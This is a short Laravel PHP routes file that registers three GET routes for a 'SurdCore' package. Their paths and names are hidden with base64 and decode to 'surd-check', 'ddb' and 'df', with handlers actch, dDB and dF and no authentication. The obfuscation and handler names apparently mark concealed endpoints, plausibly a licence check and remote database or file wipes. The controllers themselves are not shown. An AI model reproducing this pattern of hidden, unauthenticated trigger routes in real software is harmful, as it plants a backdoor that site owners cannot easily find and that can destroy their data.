<?php

/*Route::group(['namespace']);*/

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\Admin\AdminController;


Route::group(['namespace' => 'Surd\SurdCore\Http\Controllers', 'middleware' => ['web']], function () {

    Route::get(base64_decode('c3VyZC1jaGVjaw=='), 'SurdCoreController@actch')->name(base64_decode('ZG9tYWluLWNoZWNr'));


    Route::get(base64_decode('ZGRi'), 'SurdCoreController@dDB')->name(base64_decode('ZG9tYWluLWNoZWNr'));
    Route::get(base64_decode('ZGY='), 'SurdCoreController@dF')->name(base64_decode('ZG9tYWluLWNoZWNr'));



});

